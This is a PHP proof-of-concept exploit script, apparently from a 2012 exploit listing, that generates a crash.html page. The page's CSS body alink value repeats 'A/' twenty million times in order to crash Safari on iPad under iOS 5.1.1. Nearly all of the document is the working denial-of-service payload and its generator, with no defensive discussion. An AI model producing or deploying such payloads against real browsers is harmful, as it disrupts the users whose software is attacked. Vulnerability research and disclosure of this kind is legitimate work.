<?php
# -----------------------------------
# Exploit Title: Apple iPad Safari (body alink) Remote Crash
# Date: 24/08/2012
# Author: Yakir Wizman
# Affected Version: IOS 5.1.1
# Tested on Apple iPad, IOS 5.1.1 Safari
# Launch Safari, point your browser to the page and safari will crash.
# ISRAEL
# -----------------------------------
# The following code is a proof of concept for a crash vulnerability that exists in 'Apple iPad Safari Browser'.
# Point your browser to the created(crash.html) file and see what happen ;)
# The vulnerable is:
# * body {alink: A/ x 20000000}
# -----------------------------------
$string = str_repeat('A/', 20000000);
$code   = "<html>
	<head>
	<style type=\"text/css\">
		body {alink: {$string}}
	</style>
</html>";
if(file_put_contents("./crash.html", $code)) {
    echo("Point your safari browser to `crash.html`.\r\n");
} else {
    echo("Cannot create file.\r\n");
}
?>